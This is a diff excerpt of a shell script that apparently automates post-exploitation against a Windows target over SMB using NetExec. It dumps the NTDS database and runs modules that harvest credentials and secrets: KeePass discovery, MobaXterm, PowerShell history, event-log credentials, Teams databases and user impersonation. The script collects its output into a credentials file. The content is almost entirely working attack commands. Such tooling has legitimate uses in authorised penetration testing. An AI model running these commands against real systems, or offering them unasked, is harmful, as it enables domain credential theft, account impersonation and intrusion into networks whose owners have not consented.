@@ -184,10 +184,17 @@ elevated)
   script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
   
   # Interesting information commands
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M keepass_discover
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M runasppl
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True # The flag migth not work - remove if so
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M iis
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS --qwinsta
   log "Look at \"Impersonate logged-on User\" section in wiki in case of found sessions" "$INTERESTINGFILE"
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M impersonate
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
@@ -199,6 +206,8 @@ elevated)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wcc # Security conf
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M get_netconnections
+  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
 
 
   log "Extracting potential credential lines…"
